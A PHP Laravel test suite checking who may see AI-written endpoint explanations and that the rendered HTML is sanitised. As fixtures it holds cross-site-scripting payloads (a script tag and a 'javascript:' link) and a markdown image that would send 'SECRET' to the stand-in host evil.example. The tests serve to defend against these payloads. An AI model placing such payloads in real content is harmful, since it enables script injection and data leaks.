<?php

namespace Tests\Feature\Ai;

use App\Domain\Analysis\EndpointAnalyses;
use App\Domain\Projects\ProjectStatus;
use App\Domain\Sources\RunStatus;
use App\Domain\Workspaces\WorkspaceRole;
use App\Models\AiProvider;
use App\Models\AiRun;
use App\Models\EndpointAnalysis;
use App\Models\Project;
use App\Models\WorkflowExplanation;
use App\Models\Workspace;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Tests\Concerns\WorksWithWorkspaces;
use Tests\TestCase;

/** The Workflow tab's JSON: the AI block and who sees the explanation (spec § 6.5a, § 6.8, § 7). */
class WorkflowExplanationAccessTest extends TestCase
{
    use RefreshDatabase, WorksWithWorkspaces;

    private const MARKDOWN = "## Overview\nPlaces the order SECRET-PLAN.\n\n<script>alert(1)</script>\n\n[x](javascript:alert(1))";

    private EndpointAnalysis $advanced;

    private Project $project;

    protected function setUp(): void
    {
        parent::setUp();
        $this->enableWorkspaces();
        config(['features.project_wizard' => true, 'features.source_snapshots' => true, 'features.framework_detection' => true, 'features.route_discovery' => true, 'features.endpoint_analysis' => true, 'features.advanced_analysis' => true, 'features.ai_settings' => true, 'app.debug' => false]);

        $this->advanced = EndpointAnalysis::factory()->create(['profile' => EndpointAnalyses::ADVANCED, 'status' => RunStatus::Completed, 'finished_at' => now()]);
        $this->project = $this->advanced->project;
    }

    private function url(?EndpointAnalysis $analysis = null): string
    {
        return "/projects/{$this->project->id}/analyses/".($analysis ?? $this->advanced)->id.'/dependencies';
    }

    private function provider(array $attributes = []): AiProvider
    {
        return AiProvider::factory()->create([
            'provider' => 'anthropic', 'is_default' => true, 'enabled' => true, 'model' => 'claude-test',
            'available_models' => [['id' => 'claude-test', 'effort' => true]], 'effort' => 'high', ...$attributes,
        ]);
    }

    private function completed(): WorkflowExplanation
    {
        $provider = $this->provider();
        $run = new AiRun;
        $run->forceFill(['ai_provider_id' => $provider->id, 'provider' => 'anthropic', 'model' => 'claude-test', 'effort' => 'high', 'input_tokens' => 1200, 'output_tokens' => 300, 'status' => 'succeeded', 'duration_ms' => 5, 'prompt_version' => 'v1'])->save();

        return WorkflowExplanation::factory()->create([
            'endpoint_analysis_id' => $this->advanced->id, 'status' => 'completed', 'provider' => 'anthropic', 'model' => 'claude-test',
            'effort' => 'high', 'markdown' => self::MARKDOWN, 'omitted' => ['OrderService::audit'], 'ai_run_id' => $run->id, 'finished_at' => now(),
            'prompt_version' => 'workflow-explain-v1',
        ]);
    }

    public function test_viewer_and_qa_get_hidden_explanation_without_markdown(): void
    {
        $explanation = $this->completed();

        foreach ([WorkspaceRole::QA, WorkspaceRole::Viewer] as $role) {
            $member = $this->memberOf($role, $this->project->workspace);
            $response = $this->actingAs($member)->getJson($this->url())->assertOk();
            $this->assertSame(['hidden' => true, 'stage' => null], $response->json('explanation'), $role->value);
            $this->assertStringNotContainsString('SECRET-PLAN', $response->getContent(), $role->value);
            $this->assertFalse($response->json('canExplain'), $role->value);

            // A run in progress shows its stage to every role (spec § 6.5a), and still nothing it was written from.
            $explanation->forceFill(['status' => 'running'])->save();
            $response = $this->getJson($this->url())->assertOk();
            $this->assertSame(['hidden' => true, 'stage' => 'writing'], $response->json('explanation'), $role->value);
            $this->assertStringNotContainsString('SECRET-PLAN', $response->getContent(), $role->value);
            $explanation->forceFill(['status' => 'completed'])->save();
        }
    }

    public function test_developer_gets_markdown_and_safe_html(): void
    {
        $this->completed();

        $json = $this->actingAs($this->memberOf(WorkspaceRole::Developer, $this->project->workspace))->getJson($this->url())->assertOk()->json('explanation');

        $this->assertSame(
            ['hidden', 'status', 'stage', 'failureMessage', 'retryable', 'markdown', 'html', 'truncated', 'omitted', 'provider', 'model', 'promptVersion', 'inputUnits', 'outputUnits', 'finishedAt'],
            array_keys($json),
        );
        $this->assertFalse($json['hidden']);
        $this->assertSame('completed', $json['status']);
        $this->assertSame('workflow-explain-v1', $json['promptVersion']);
        $this->assertNull($json['stage']);
        $this->assertSame(self::MARKDOWN, $json['markdown']);
        $this->assertStringContainsString('SECRET-PLAN', $json['html']);
        $this->assertStringNotContainsString('<script', $json['html']);
        $this->assertStringNotContainsString('javascript:', $json['html']);
        $this->assertSame(['OrderService::audit'], $json['omitted']);
        $this->assertSame([1200, 300], [$json['inputUnits'], $json['outputUnits']]);
        $this->assertSame(['Anthropic', 'claude-test'], [$json['provider'], $json['model']]);
        $this->assertNotNull($json['finishedAt']);
        $this->assertNull($json['failureMessage']);
    }

    public function test_html_drops_remote_images_and_marks_links_nofollow(): void
    {
        $this->completed()->forceFill(['markdown' => 'See ![a <b> & c](https://evil.example/p?d=SECRET) and [docs](https://laravel.com/docs).'])->save();

        $html = $this->actingAs($this->memberOf(WorkspaceRole::Developer, $this->project->workspace))->getJson($this->url())->assertOk()->json('explanation.html');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('evil.example', $html);
        $this->assertStringContainsString('See a &lt;b&gt; &amp; c and', $html, 'the image is replaced by its alt text, escaped once');
        $this->assertStringContainsString('<a href="https://laravel.com/docs" rel="noopener noreferrer nofollow">docs</a>', $html);
    }

    public function test_running_and_failed_explanations_report_stage_and_reason(): void
    {
        $explanation = WorkflowExplanation::factory()->create(['endpoint_analysis_id' => $this->advanced->id, 'status' => 'tracing']);
        $developer = $this->memberOf(WorkspaceRole::Developer, $this->project->workspace);

        $this->actingAs($developer)->getJson($this->url())->assertJsonPath('explanation.stage', 'tracing')->assertJsonPath('explanation.html', null);
        $explanation->forceFill(['status' => 'running'])->save();
        $this->getJson($this->url())->assertJsonPath('explanation.stage', 'writing');

        $explanation->forceFill(['status' => 'failed', 'failure_code' => 'ai.rate_limited'])->save();
        $this->getJson($this->url())->assertJsonPath('explanation.stage', null)->assertJsonPath('explanation.retryable', true)
            ->assertJsonPath('explanation.failureMessage', 'The AI provider is rate-limiting requests. Try again in a minute.');
        $explanation->forceFill(['failure_code' => 'ai.trace_failed'])->save();
        $this->getJson($this->url())->assertJsonPath('explanation.retryable', false);
    }

    public function test_ai_block_reports_gate_reason_and_settings_url_only_for_admin(): void
    {
        $developer = $this->memberOf(WorkspaceRole::Developer, $this->project->workspace);
        $admin = $this->memberOf(WorkspaceRole::Developer, $this->project->workspace);
        $admin->forceFill(['is_platform_admin' => true])->save();

        // No provider: the gate's reason, no provider details.
        $ai = $this->actingAs($developer)->getJson($this->url())->assertOk()->json('ai');
        $this->assertFalse($ai['available']);
        $this->assertStringContainsString('No AI provider is set up', $ai['reason']);
        $this->assertNull($ai['provider']);
        $this->assertNull($ai['settingsUrl']);
        $this->assertSame(route('ai-settings.edit'), $this->actingAs($admin)->getJson($this->url())->json('ai.settingsUrl'));

        // Not tested yet: the provider is named, still unavailable.
        $provider = $this->provider(['status' => 'unchecked']);
        $ai = $this->actingAs($developer)->getJson($this->url())->json('ai');
        $this->assertFalse($ai['available']);
        $this->assertStringContainsString('Anthropic is not ready', $ai['reason']);

        // Ready with a daily limit: tokens left and the period.
        $provider->forceFill(['status' => 'ready', 'limit_tokens' => 5000, 'limit_period' => 'day'])->save();
        $this->assertSame(
            ['available' => true, 'reason' => null, 'provider' => 'Anthropic', 'model' => 'claude-test', 'effort' => 'high', 'left' => 5000, 'period' => 'day', 'settingsUrl' => null],
            $this->getJson($this->url())->json('ai'),
        );
        $this->assertTrue($this->getJson($this->url())->json('canExplain'));

        // No limit: nothing left to count, so no period either.
        $provider->forceFill(['limit_tokens' => null])->save();
        $this->assertSame([null, null], [$this->getJson($this->url())->json('ai.left'), $this->getJson($this->url())->json('ai.period')]);
    }

    public function test_cross_workspace_404_on_show_and_store(): void
    {
        $this->completed();
        $elsewhere = Workspace::factory()->create();
        $stranger = $this->memberOf(WorkspaceRole::Owner, $elsewhere);
        $own = Project::factory()->for($elsewhere)->create();

        $this->actingAs($stranger)->getJson($this->url())->assertNotFound();
        $this->actingAs($stranger)->post($this->url())->assertNotFound();
        $this->actingAs($stranger)->getJson("/projects/{$own->id}/analyses/{$this->advanced->id}/dependencies")->assertNotFound();
        $this->actingAs($stranger)->post("/projects/{$own->id}/analyses/{$this->advanced->id}/dependencies")->assertNotFound();
        $this->assertSame('completed', WorkflowExplanation::query()->sole()->status);
    }

    public function test_store_without_ai_returns_error_toast_and_queues_nothing(): void
    {
        Queue::fake();
        $basic = EndpointAnalysis::factory()->create(['api_endpoint_id' => $this->advanced->api_endpoint_id, 'status' => RunStatus::Completed]);
        $developer = $this->memberOf(WorkspaceRole::Developer, $this->project->workspace);

        $this->actingAs($developer)->post($this->url($basic))->assertRedirect()
            ->assertSessionHas('inertia.flash_data.toast.type', 'error')
            ->assertSessionHas('inertia.flash_data.toast.message', fn (string $m) => str_contains($m, 'No AI provider is set up'));

        config(['features.ai_settings' => false]);
        $this->post($this->url($basic), ['again' => true])->assertRedirect()
            ->assertSessionHas('inertia.flash_data.toast.message', 'AI is turned off on this platform.');

        Queue::assertNothingPushed();
        $this->assertSame(0, WorkflowExplanation::query()->count());
        $this->assertSame(1, EndpointAnalysis::query()->where('profile', EndpointAnalyses::ADVANCED)->count(), 'no new trace');
    }

    public function test_archived_project_cannot_start_an_explanation(): void
    {
        Queue::fake();
        $this->provider(['status' => 'ready']);
        $basic = EndpointAnalysis::factory()->create(['api_endpoint_id' => $this->advanced->api_endpoint_id, 'status' => RunStatus::Completed]);
        $developer = $this->memberOf(WorkspaceRole::Developer, $this->project->workspace);
        $this->project->forceFill(['status' => ProjectStatus::Archived, 'archived_at' => now()])->save();

        $this->actingAs($developer)->post($this->url($basic), ['again' => true])->assertRedirect()
            ->assertSessionHas('inertia.flash_data.toast.type', 'error')
            ->assertSessionHas('inertia.flash_data.toast.message', 'This project is archived. Restore it before making changes.');

        // Refused for being archived before the AI gate is even asked.
        config(['features.ai_settings' => false]);
        $this->post($this->url($basic))->assertSessionHas('inertia.flash_data.toast.message', 'This project is archived. Restore it before making changes.');

        Queue::assertNothingPushed();
        $this->assertSame(0, WorkflowExplanation::query()->count());
        $this->assertSame(RunStatus::Completed, $this->advanced->refresh()->status, 'the trace is not re-run');
    }
}
